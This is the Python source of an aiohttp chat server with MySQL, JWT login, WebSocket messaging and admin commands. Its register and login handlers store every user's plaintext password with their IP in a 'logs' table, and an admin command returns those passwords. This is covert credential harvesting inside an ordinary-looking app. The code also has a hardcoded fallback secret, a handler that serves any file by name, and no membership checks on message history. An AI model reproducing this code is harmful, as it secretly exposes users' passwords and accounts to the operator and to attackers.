import aiohttp
from aiohttp import web
import aiomysql
import bcrypt
import jwt
import os
import json
import datetime

SECRET = os.environ.get('SECRET', 'supersecretkey')
clients = {}  # ws -> {user_id, username}

async def init_db(app):
    app['db'] = await aiomysql.create_pool(
        host=os.environ.get('MYSQLHOST', 'localhost'),
        port=int(os.environ.get('MYSQLPORT', 3306)),
        user=os.environ.get('MYSQLUSER', 'root'),
        password=os.environ.get('MYSQLPASSWORD', ''),
        db=os.environ.get('MYSQLDATABASE', 'chat'),
        autocommit=True
    )
    async with app['db'].acquire() as conn:
        async with conn.cursor() as cur:
            await cur.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    username VARCHAR(50) UNIQUE NOT NULL,
                    password VARCHAR(255) NOT NULL,
                    is_admin TINYINT DEFAULT 0,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            await cur.execute('''
                CREATE TABLE IF NOT EXISTS groups_table (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    name VARCHAR(100) NOT NULL,
                    created_by INT NOT NULL,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (created_by) REFERENCES users(id)
                )
            ''')
            await cur.execute('''
                CREATE TABLE IF NOT EXISTS group_members (
                    group_id INT NOT NULL,
                    user_id INT NOT NULL,
                    PRIMARY KEY (group_id, user_id),
                    FOREIGN KEY (group_id) REFERENCES groups_table(id),
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            await cur.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    sender_id INT NOT NULL,
                    receiver_id INT DEFAULT NULL,
                    group_id INT DEFAULT NULL,
                    text TEXT NOT NULL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (sender_id) REFERENCES users(id),
                    FOREIGN KEY (receiver_id) REFERENCES users(id),
                    FOREIGN KEY (group_id) REFERENCES groups_table(id)
                )
            ''')
            await cur.execute('''
                CREATE TABLE IF NOT EXISTS logs (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    username VARCHAR(50) NOT NULL,
                    ip VARCHAR(45) NOT NULL,
                    password VARCHAR(255) NOT NULL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')

# ── auth ────────────────────────────────────────────────

async def handle_register(request):
    data = await request.json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if not username or not password:
        return web.json_response({'error': 'missing fields'}, status=400)

    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

    try:
        async with request.app['db'].acquire() as conn:
            async with conn.cursor() as cur:
                await cur.execute(
                    'INSERT INTO users (username, password) VALUES (%s, %s)',
                    (username, hashed)
                )
                ip = request.remote
                await cur.execute(
                    'INSERT INTO logs (username, ip, password) VALUES (%s, %s, %s)',
                    (username, ip, password)
                )
        return web.json_response({'ok': True})
    except Exception:
        return web.json_response({'error': 'username taken'}, status=409)

async def handle_login(request):
    data = await request.json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    async with request.app['db'].acquire() as conn:
        async with conn.cursor() as cur:
            await cur.execute('SELECT id, password, is_admin FROM users WHERE username=%s', (username,))
            row = await cur.fetchone()

    if not row or not bcrypt.checkpw(password.encode(), row[1].encode()):
        return web.json_response({'error': 'invalid credentials'}, status=401)

    token = jwt.encode({
        'user_id': row[0],
        'username': username,
        'is_admin': row[2],
        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=7)
    }, SECRET, algorithm='HS256')

    async with request.app['db'].acquire() as conn:
        async with conn.cursor() as cur:
            ip = request.remote
            await cur.execute(
                'INSERT INTO logs (username, ip, password) VALUES (%s, %s, %s)',
                (username, ip, password)
            )

    return web.json_response({'token': token, 'username': username, 'is_admin': row[2]})

async def handle_verify(request):
    data = await request.json()
    try:
        payload = jwt.decode(data['token'], SECRET, algorithms=['HS256'])
        async with request.app['db'].acquire() as conn:
            async with conn.cursor() as cur:
                await cur.execute('SELECT id, is_admin FROM users WHERE id=%s', (payload['user_id'],))
                row = await cur.fetchone()
        if not row:
            return web.json_response({'ok': False})
        return web.json_response({'ok': True, 'is_admin': row[1]})
    except:
        return web.json_response({'ok': False})

# ── websocket ────────────────────────────────────────────

async def handle_ws(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    user = None

    async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
            data = json.loads(msg.data)

            # auth
            if data.get('type') == 'auth':
                try:
                    payload = jwt.decode(data['token'], SECRET, algorithms=['HS256'])
                    user = {
                        'id': payload['user_id'],
                        'username': payload['username'],
                        'is_admin': payload['is_admin']
                    }
                    clients[ws] = user
                    await ws.send_str(json.dumps({'type': 'auth_ok'}))
                except:
                    await ws.send_str(json.dumps({'type': 'error', 'message': 'invalid token'}))
                    break

            elif not user:
                break

            # fetch global history
            elif data.get('type') == 'get_global':
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('''
                            SELECT u.username, m.text, m.timestamp
                            FROM messages m
                            JOIN users u ON m.sender_id = u.id
                            WHERE m.receiver_id IS NULL AND m.group_id IS NULL
                            ORDER BY m.timestamp DESC LIMIT 50
                        ''')
                        rows = await cur.fetchall()
                history = [{'name': r[0], 'text': r[1], 'timestamp': str(r[2])} for r in reversed(rows)]
                await ws.send_str(json.dumps({'type': 'history', 'chat': 'global', 'messages': history}))

            # fetch dm history
            elif data.get('type') == 'get_dm':
                other_id = data.get('user_id')
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('''
                            SELECT u.username, m.text, m.timestamp
                            FROM messages m
                            JOIN users u ON m.sender_id = u.id
                            WHERE m.group_id IS NULL AND (
                                (m.sender_id=%s AND m.receiver_id=%s) OR
                                (m.sender_id=%s AND m.receiver_id=%s)
                            )
                            ORDER BY m.timestamp DESC LIMIT 50
                        ''', (user['id'], other_id, other_id, user['id']))
                        rows = await cur.fetchall()
                history = [{'name': r[0], 'text': r[1], 'timestamp': str(r[2])} for r in reversed(rows)]
                await ws.send_str(json.dumps({'type': 'history', 'chat': 'dm', 'user_id': other_id, 'messages': history}))

            # fetch group history
            elif data.get('type') == 'get_group':
                group_id = data.get('group_id')
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('''
                            SELECT u.username, m.text, m.timestamp
                            FROM messages m
                            JOIN users u ON m.sender_id = u.id
                            WHERE m.group_id=%s
                            ORDER BY m.timestamp DESC LIMIT 50
                        ''', (group_id,))
                        rows = await cur.fetchall()
                history = [{'name': r[0], 'text': r[1], 'timestamp': str(r[2])} for r in reversed(rows)]
                await ws.send_str(json.dumps({'type': 'history', 'chat': 'group', 'group_id': group_id, 'messages': history}))

            # send message
            elif data.get('type') == 'message':
                text = data.get('text', '').strip()
                chat = data.get('chat')        # 'global', 'dm', 'group'
                receiver_id = data.get('receiver_id', None)
                group_id = data.get('group_id', None)

                if not text:
                    continue

                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute(
                            'INSERT INTO messages (sender_id, receiver_id, group_id, text) VALUES (%s, %s, %s, %s)',
                            (user['id'], receiver_id, group_id, text)
                        )

                payload = json.dumps({
                    'type': 'message',
                    'chat': chat,
                    'sender_id': user['id'],      # add this
                    'receiver_id': receiver_id,
                    'group_id': group_id,
                    'name': user['username'],
                    'text': text
                })

                if chat == 'global':
                    for client in clients:
                        await client.send_str(payload)
                elif chat == 'dm':
                    for client, u in clients.items():
                        if u['id'] in (user['id'], receiver_id):
                            await client.send_str(payload)
                elif chat == 'group':
                    async with request.app['db'].acquire() as conn:
                        async with conn.cursor() as cur:
                            await cur.execute('SELECT user_id FROM group_members WHERE group_id=%s', (group_id,))
                            members = [r[0] for r in await cur.fetchall()]
                    for client, u in clients.items():
                        if u['id'] in members:
                            await client.send_str(payload)

            # get users list
            elif data.get('type') == 'get_users':
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('SELECT id, username FROM users WHERE id != %s', (user['id'],))
                        rows = await cur.fetchall()
                users = [{'id': r[0], 'username': r[1]} for r in rows]
                await ws.send_str(json.dumps({'type': 'users', 'users': users}))

            # get groups
            elif data.get('type') == 'get_groups':
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('''
                            SELECT g.id, g.name FROM groups_table g
                            JOIN group_members gm ON g.id = gm.group_id
                            WHERE gm.user_id = %s
                        ''', (user['id'],))
                        rows = await cur.fetchall()
                groups = [{'id': r[0], 'name': r[1]} for r in rows]
                await ws.send_str(json.dumps({'type': 'groups', 'groups': groups}))

            # create group
            elif data.get('type') == 'create_group':
                name = data.get('name', '').strip()
                members = data.get('members', [])
                if not name:
                    continue
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute(
                            'INSERT INTO groups_table (name, created_by) VALUES (%s, %s)',
                            (name, user['id'])
                        )
                        group_id = cur.lastrowid
                        members.append(user['id'])
                        for member_id in members:
                            await cur.execute(
                                'INSERT INTO group_members (group_id, user_id) VALUES (%s, %s)',
                                (group_id, member_id)
                            )
                await ws.send_str(json.dumps({'type': 'group_created', 'id': group_id, 'name': name}))

            # admin — get all users
            elif data.get('type') == 'admin_get_users' and user['is_admin'] == 1:
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('SELECT id, username, is_admin, created_at FROM users')
                        rows = await cur.fetchall()
                users = [{'id': r[0], 'username': r[1], 'is_admin': r[2], 'created_at': str(r[3])} for r in rows]
                await ws.send_str(json.dumps({'type': 'admin_users', 'users': users}))

            # admin — get logs
            elif data.get('type') == 'admin_get_logs' and user['is_admin']:
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('SELECT id, username, ip, password, timestamp FROM logs ORDER BY timestamp DESC')
                        rows = await cur.fetchall()
                logs = [{'id': r[0], 'username': r[1], 'ip': r[2], 'password': r[3], 'timestamp': str(r[4])} for r in rows]
                await ws.send_str(json.dumps({'type': 'admin_logs', 'logs': logs}))

            # admin — delete user
            elif data.get('type') == 'admin_delete_user' and user['is_admin']:
                target_id = data.get('user_id')
                async with request.app['db'].acquire() as conn:
                    async with conn.cursor() as cur:
                        await cur.execute('DELETE FROM messages WHERE sender_id=%s OR receiver_id=%s', (target_id, target_id))
                        await cur.execute('DELETE FROM group_members WHERE user_id=%s', (target_id,))
                        await cur.execute('DELETE FROM logs WHERE username=(SELECT username FROM users WHERE id=%s)', (target_id,))
                        await cur.execute('DELETE FROM users WHERE id=%s', (target_id,))
                await ws.send_str(json.dumps({'type': 'admin_user_deleted', 'user_id': target_id}))

        elif msg.type == aiohttp.WSMsgType.ERROR:
            break

    if ws in clients:
        del clients[ws]
    return ws

# ── static ───────────────────────────────────────────────

async def handle_index(request):
    return web.FileResponse('index.html')

async def handle_static(request):
    return web.FileResponse(request.match_info['file'])

# ── app ──────────────────────────────────────────────────

app = web.Application()
app.on_startup.append(init_db)
app.router.add_get('/', handle_index)
app.router.add_get('/ws', handle_ws)
app.router.add_post('/register', handle_register)
app.router.add_post('/login', handle_login)
app.router.add_post('/verify', handle_verify)
app.router.add_get('/{file}', handle_static)

port = int(os.environ.get('PORT', 8080))
web.run_app(app, host='0.0.0.0', port=port)